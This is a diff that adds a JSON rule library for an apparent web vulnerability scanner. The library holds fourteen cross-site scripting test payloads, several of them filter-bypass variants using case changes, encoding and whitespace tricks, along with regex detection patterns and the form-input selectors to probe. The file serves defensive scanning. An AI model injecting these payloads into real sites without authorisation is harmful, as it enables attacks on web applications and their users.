@@ -1,0 +1,199 @@
+{
+  "version": "1.0.0",
+  "last_updated": "2025-12-04T10:00:00Z",
+  "description": "XSS (Cross-Site Scripting) 漏洞檢測規則庫",
+  "author": "WebSecScan Security Team",
+  "payloads": [
+    {
+      "id": "xss-001",
+      "payload": "<script>alert(\"XSS\")</script>",
+      "description": "Basic script alert",
+      "type": "reflected",
+      "severity": "high",
+      "category": "basic",
+      "enabled": true
+    },
+    {
+      "id": "xss-002",
+      "payload": "<img src=\"x\" onerror=\"alert('XSS')\">",
+      "description": "Image tag with onerror",
+      "type": "reflected",
+      "severity": "high",
+      "category": "event-handler",
+      "enabled": true
+    },
+    {
+      "id": "xss-003",
+      "payload": "<svg onload=\"alert(1)\">",
+      "description": "SVG onload event",
+      "type": "reflected",
+      "severity": "high",
+      "category": "svg",
+      "enabled": true
+    },
+    {
+      "id": "xss-004",
+      "payload": "\"><script>alert(String.fromCharCode(88,83,83))</script>",
+      "description": "Breaking out of attributes",
+      "type": "reflected",
+      "severity": "high",
+      "category": "context-breaking",
+      "enabled": true
+    },
+    {
+      "id": "xss-005",
+      "payload": "';alert('XSS');//",
+      "description": "JavaScript context injection",
+      "type": "reflected",
+      "severity": "high",
+      "category": "js-context",
+      "enabled": true
+    },
+    {
+      "id": "xss-006",
+      "payload": "<iframe src=\"javascript:alert('XSS')\"></iframe>",
+      "description": "JavaScript URI in iframe",
+      "type": "reflected",
+      "severity": "medium",
+      "category": "iframe",
+      "enabled": true
+    },
+    {
+      "id": "xss-007",
+      "payload": "<ScRiPt>alert(\"XSS\")</ScRiPt>",
+      "description": "Case variation bypass",
+      "type": "reflected",
+      "severity": "high",
+      "category": "bypass-filter",
+      "enabled": true
+    },
+    {
+      "id": "xss-008",
+      "payload": "<script>alert(/XSS/)</script>",
+      "description": "Regular expression alert",
+      "type": "reflected",
+      "severity": "high",
+      "category": "bypass-filter",
+      "enabled": true
+    },
+    {
+      "id": "xss-009",
+      "payload": "<script>alert`XSS`</script>",
+      "description": "Template literal alert",
+      "type": "reflected",
+      "severity": "high",
+      "category": "bypass-filter",
+      "enabled": true
+    },
+    {
+      "id": "xss-010",
+      "payload": "<script>\\u0061lert(\"XSS\")</script>",
+      "description": "Unicode encoding bypass",
+      "type": "reflected",
+      "severity": "high",
+      "category": "encoding-bypass",
+      "enabled": true
+    },
+    {
+      "id": "xss-011",
+      "payload": "<img/src=\"x\"/onerror=\"alert(1)\">",
+      "description": "Whitespace bypass",
+      "type": "reflected",
+      "severity": "high",
+      "category": "whitespace-bypass",
+      "enabled": true
+    },
+    {
+      "id": "xss-012",
+      "payload": "#<script>alert(\"DOM-XSS\")</script>",
+      "description": "Hash-based DOM XSS",
+      "type": "dom",
+      "severity": "high",
+      "category": "dom-based",
+      "enabled": true
+    },
+    {
+      "id": "xss-013",
+      "payload": "javascript:alert(\"DOM-XSS\")",
+      "description": "JavaScript protocol",
+      "type": "dom",
+      "severity": "medium",
+      "category": "dom-based",
+      "enabled": true
+    },
+    {
+      "id": "xss-014",
+      "payload": "<script>/*stored*/alert(\"Stored-XSS\")/**/</script>",
+      "description": "Stored XSS with comments",
+      "type": "stored",
+      "severity": "critical",
+      "category": "stored",
+      "enabled": true
+    }
+  ],
+  "detection_patterns": [
+    {
+      "id": "det-001",
+      "pattern": "<script[^>]*>.*?alert.*?</script>",
+      "description": "Script tag with alert",
+      "confidence": "high"
+    },
+    {
+      "id": "det-002",
+      "pattern": "<img[^>]*onerror[^>]*=",
+      "description": "Image with onerror handler",
+      "confidence": "high"
+    },
+    {
+      "id": "det-003",
+      "pattern": "<svg[^>]*onload[^>]*=",
+      "description": "SVG with onload handler",
+      "confidence": "high"
+    },
+    {
+      "id": "det-004",
+      "pattern": "<iframe[^>]*src[^>]*=.*javascript:",
+      "description": "Iframe with javascript URI",
+      "confidence": "high"
+    },
+    {
+      "id": "det-005",
+      "pattern": "javascript:.*alert",
+      "description": "JavaScript protocol with alert",
+      "confidence": "high"
+    },
+    {
+      "id": "det-006",
+      "pattern": "alert\\s*\\(",
+      "description": "Alert function call",
+      "confidence": "medium"
+    },
+    {
+      "id": "det-007",
+      "pattern": "eval\\s*\\(",
+      "description": "Eval function call",
+      "confidence": "medium"
+    },
+    {
+      "id": "det-008",
+      "pattern": "document\\.write",
+      "description": "Document.write call",
+      "confidence": "medium"
+    },
+    {
+      "id": "det-009",
+      "pattern": "innerHTML.*=",
+      "description": "innerHTML assignment",
+      "confidence": "medium"
+    }
+  ],
+  "input_patterns": [
+    "input[type=\"text\"]",
+    "input[type=\"search\"]",
+    "input[type=\"email\"]",
+    "input[type=\"url\"]",
+    "textarea",
+    "select",
+    "[contenteditable]"
+  ]
+}
